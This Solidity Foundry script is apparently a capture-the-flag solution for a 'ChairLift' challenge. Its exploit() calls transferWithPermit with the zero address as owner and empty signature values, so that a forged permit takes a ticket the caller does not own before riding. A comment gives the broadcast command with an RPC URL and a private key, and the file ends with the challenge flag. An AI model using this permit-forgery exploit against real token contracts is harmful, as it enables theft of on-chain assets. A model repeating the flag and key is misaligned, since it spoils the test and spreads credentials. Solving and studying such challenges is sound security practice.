// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Ticket} from  "../src/ChairLift/Ticket.sol";
import {ChairLift} from "../src/ChairLift/ChairLift.sol";
import {Setup} from "../src/ChairLift/Setup.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack().exploit();
        console.log("Attack Success");
        vm.stopBroadcast();
    }
}

contract Attack{
    Setup public setupContract = Setup(0xB09c4177c15f9C5d4F6a8f1Bfa06cF4b77907Ff7);
    ChairLift public chairlift = ChairLift(address(setupContract.TARGET()));
    Ticket public ticket = Ticket(address(chairlift.ticket()));

    function exploit() public{
        ticket.transferWithPermit(address(0), address(this), 1, block.timestamp+100, 0, 0, 0);
        chairlift.takeRide(1);
    }
}

//forge script script/ChairLiftAttack.s.sol:AttackScript --rpc-url http://34.159.107.195:18548/7daf0497-11cf-4a56-b774-f92ec9b89545 --private-key 0x09a06d2352d46c78a39fc3bba5a85f44354865a3677badfbb6d6c751cb3c5939 --broadcast

//gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}
